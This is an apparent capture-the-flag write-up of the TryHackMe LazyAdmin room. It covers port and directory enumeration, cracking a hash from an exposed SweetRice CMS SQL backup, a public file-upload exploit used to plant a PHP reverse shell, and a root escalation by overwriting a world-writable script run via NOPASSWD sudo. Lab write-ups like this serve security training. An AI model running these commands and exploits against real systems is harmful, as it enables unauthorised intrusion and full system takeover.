---
title: "LazyAdmin - THM"
# author:
#   name: 0xKirito
#   link: https://github.com/0xKirito
date: 2025-09-15 20:33:21 +05:30
categories: [Writeups, TryHackMe]
media_subpath: /assets/img/writeups/lazyadmin/
tags: [THM, CMS]
render_with_liquid: false
---

## Enumeration

```sh
export IP=10.201.118.110
sudo nmap -Pn -p- --min-rate 3000 -sC -sV -v $IP -oN scan.txt
```

```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 49:7c:f7:41:10:43:73:da:2c:e6:38:95:86:f8:e0:f0 (RSA)
|   256 2f:d7:c4:4c:e8:1b:5a:90:44:df:c0:63:8c:72:ae:55 (ECDSA)
|_  256 61:84:62:27:c6:c3:29:17:dd:27:45:9e:29:cb:90:5e (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Seems like we only have 2 services running here:

- 80 <span class="fat-arrow">=></span> HTTP
- 22 <span class="fat-arrow">=></span> SSH

### HTTP

Since we have HTTP, let's do some dirbusting while we manually inspect the website.

Manually inspecting the webpage, we see the default Apache page:

![thm-lazyadmin-default-apache-page.png](thm-lazyadmin-default-apache-page.png)

```sh
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories.txt -u http://$IP/FUZZ

content          [Status: 301, Size: 318, Words: 20, Lines: 10, Duration: 284ms]
server-status    [Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 285ms]
```

```sh
gobuster dir -u http://$IP/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories.txt

Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.201.118.110/
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/content              (Status: 301) [Size: 318] [--> http://10.201.118.110/content/]
/server-status        (Status: 403) [Size: 279]
Progress: 29999 / 29999 (100.00%)
```

And visiting `/content` from the dirbusting results shows what looks like SweetRice CMS:

![thm-lazyadmin-sweetrice-cms.png](thm-lazyadmin-sweetrice-cms.png)

```sh
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories.txt -u http://$IP/content/FUZZ

inc           [Status: 301, Size: 320, Words: 20, Lines: 10, Duration: 288ms]
_themes       [Status: 301, Size: 324, Words: 20, Lines: 10, Duration: 287ms]
images        [Status: 301, Size: 323, Words: 20, Lines: 10, Duration: 281ms]
js            [Status: 301, Size: 319, Words: 20, Lines: 10, Duration: 282ms]
attachment    [Status: 301, Size: 327, Words: 20, Lines: 10, Duration: 280ms]
as            [Status: 301, Size: 319, Words: 20, Lines: 10, Duration: 288ms]


gobuster dir -u http://$IP/content -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories.txt -t 100
```

I decided to continue dirbusting the `/content` dir while I looked for SweetRice exploits. And found `/inc` dir which had `mysql_backup`.

I'm not sure if this is the official repo for SweetRice but I found it on GitHub: [https://github.com/sweetrice/SweetRice](https://github.com/sweetrice/SweetRice) and going through the dirs, I found `inc`, and the `latest.txt` file seemed to have SweetRice CMS version. Which in this case was 1.5.1.

- SweetRice CMS version 1.5.1

![thm-lazyadmin-sweetrice-cms-mysql-backup.png](thm-lazyadmin-sweetrice-cms-mysql-backup.png)

And `$IP/content/inc/mysql_backup/` had `mysql_bakup_20191129023059-1.5.1.sql` SQL file.

![thm-lazyadmin-sweetrice-cms-mysql-backup-file.png](thm-lazyadmin-sweetrice-cms-mysql-backup-file.png)

---

## Exploitation

I downloaded the backup SQL file and opened it in a text editor. Searching for "pass" in it took me to this line:

```sql
"Description\\";s:5:\\"admin\\";s:7:\\"manager\\";s:6:\\"passwd\\";s:32:\\"42f749ade7f9e195bf475f37a44cafcb\\
```

The dirbusting earlier had also revealed `/content/as` path and if you visit that path on the IP: http://$IP/content/as/ it takes you to what looks like a CMS login page.

![thm-lazyadmin-sweetrice-cms-login.png](thm-lazyadmin-sweetrice-cms-login.png)

From that SQL backup file earlier, it seems like we have an username of "manager" (or "admin") and password of "42f749ade7f9e195bf475f37a44cafcb" which looks like a hash. So I tried it on [CrackStation](https://crackstation.net/) and found the password to be: "Password123".

- `manager`:`Password123`

And trying those credentials logged me in.

![thm-lazyadmin-sweetrice-cms-authenticated-user.png](thm-lazyadmin-sweetrice-cms-authenticated-user.png)

At a quick glance, I didn't see any options to directly upload any files from the UI. So I tried searching for exploits on the internet and on ExploitDB with `searchsploit`.

```sh
searchsploit sweetrice

SweetRice 1.5.1 - Arbitrary File Download | php/webapps/40698.py
SweetRice 1.5.1 - Arbitrary File Upload   | php/webapps/40716.py
SweetRice 1.5.1 - Backup Disclosure       | php/webapps/40718.txt
SweetRice 1.5.1 - Cross-Site Request Forgery | php/webapps/40692.html
SweetRice 1.5.1 - Cross-Site Request Forgery / PHP Code Execution | php/webapps/40700.html
```

[40716](https://www.exploit-db.com/exploits/40716) - If you read the exploit, it requires username and password for authentication and can upload files to the CMS. So we can try uploading and executing some reverse shells.

`searchsploit -m 40716` to copy the exploit file to your dir.

I got a PentestMonkey PHP reverse shell ready with my `tun0` IP and port 4444, named the file `revshell.php5` (as one of the extensions the exploit suggested).

The first time I only provided the IP for target but that didn't work. After going through the code, I realized it was appending `/as` instead of `/content/as` to the IP:

```python
login = r.post('http://' + host + '/as/?type=signin', data=payload)
```

So I ran it again, this time with target as `IP/content` and it worked as expected.

![thm-lazyadmin-sweetrice-cms-file-upload-exploit.png](thm-lazyadmin-sweetrice-cms-file-upload-exploit.png)

Then I ran a local netcat listener on port 4444: `nc -lvnp 4444` and visited `http://$IP/content/attachment/revshell.php5`.

And got a reverse shell on the netcat listener as `www-data`.

![thm-lazyadmin-nc-listener-user-shell.png](thm-lazyadmin-nc-listener-user-shell.png)

Let's first upgrade the shell before looking into privilege escalation.

```sh
which python => /usr/bin/python
python -c 'import pty; pty.spawn("/bin/bash")'
Ctrl + Z to background the process
stty raw -echo; fg; reset
Press Enter
export TERM=xterm-256color
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/local/games:/usr/games:/tmp
```

- `python ./40716.py`
- Target: `$IP/content`
- Username: `manager`
- Password: `42f749ade7f9e195bf475f37a44cafcb` => CrackStation => `Password123`
- PHP reverse shell and `nc -lvnp 4444`

---

## Privilege Escalation

```sh
www-data@THM-Chal:/$ sudo -l
Matching Defaults entries for www-data on THM-Chal:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on THM-Chal:
    (ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl
```

So we can run `sudo /usr/bin/perl /home/itguy/backup.pl` as the current `www-data` user without requiring a password, and it will execute with root privileges.

Examining what the `backup.pl` does:

```sh
www-data@THM-Chal:/home/itguy$ cat backup.pl 
#!/usr/bin/perl

system("sh", "/etc/copy.sh");
```

And checking the permissions on `/etc/copy.sh`, we have write access:

```sh
www-data@THM-Chal:/home/itguy$ ls -lah /etc/copy.sh 
-rw-r--rwx 1 root root 81 Nov 29  2019 /etc/copy.sh
```

So any code we add to `/etc/copy.sh` will be executed with root privileges using `sudo` and without requiring a password.

We can just get it to run a bash shell session as root to get root for now.

```sh
www-data@THM-Chal:/home/itguy$ echo "/bin/bash" > /etc/copy.sh
www-data@THM-Chal:/home/itguy$ cat /etc/copy.sh
/bin/bash
www-data@THM-Chal:/home/itguy$ sudo /usr/bin/perl /home/itguy/backup.pl 
root@THM-Chal:/home/itguy# whoami && id
root
uid=0(root) gid=0(root) groups=0(root)
```

![thm-lazyadmin-root.png](thm-lazyadmin-root.png)

And we have `root`!

In the enumeration earlier, the SSH port was also open. So if we want, we can add another user and login via SSH as `root` for post exploitation.
